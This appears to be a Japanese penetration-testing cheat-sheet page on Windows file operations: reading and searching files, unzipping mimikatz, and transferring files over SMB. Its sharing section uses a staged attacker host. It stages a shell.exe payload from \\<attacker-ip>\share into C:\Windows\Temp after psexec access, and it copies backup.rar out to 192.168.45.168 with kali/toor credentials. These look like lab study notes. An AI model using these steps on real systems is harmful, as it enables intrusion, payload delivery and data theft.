---
title: File操作
parent: Windows
grand_parent: General
---

<details markdown="1">
<summary>type,gc</summary>
# ファイルの中身
## type
```cmd
type hoge.txt
```

# gc
```powershell
gc nsclient.ini
```
![](../../../assets/images/Pasted%20image%2020260515200136.png)
</details>

---

<details markdown="1">
<summary>findstr</summary>
# ファイル探索

##### findstr
```bash
C:\>tasklist | findstr CloudMe

# 除外
tasklist | findstr /V CloudMe
```
---
# 解凍
```bash
Expand-Archive -Path .\mimikatz.zip
```

# Share

## net use
net use + copy を使う（psexec で実現する方法）

psexec.py でシェルが出たら SMB マウントしてコピーできます。

例：Kali の共有を Windows にマウントしてファイル転送

Kali 側 SMB サーバ（例：impacket-smbserver）を起動：

```zsh
sudo smbserver.py share /tmp
```


psexec で接続後（Windows側で実行）：

```cmd
net use Z: \\<attacker-ip>\share
copy Z:\shell.exe C:\Windows\Temp\
```

これで psexec 経由でファイル転送可能

## Powershell
```powershell
PS C:\\Users\\victor\\Downloads> New-SmbMapping -RemotePath '\\\\192.168.45.168\\offsec' -Username "kali" -Password "toor" -LocalPath 'F:'

Status Local Path Remote Path
------ ---------- -----------
OK     F:         \\\\192.168.45.168\\offsec
PS C:\\Users\\victor\\Downloads> cd F:
PS F:\\> cp C:\\Users\\victor\\Downloads\\backup.rar ./
```
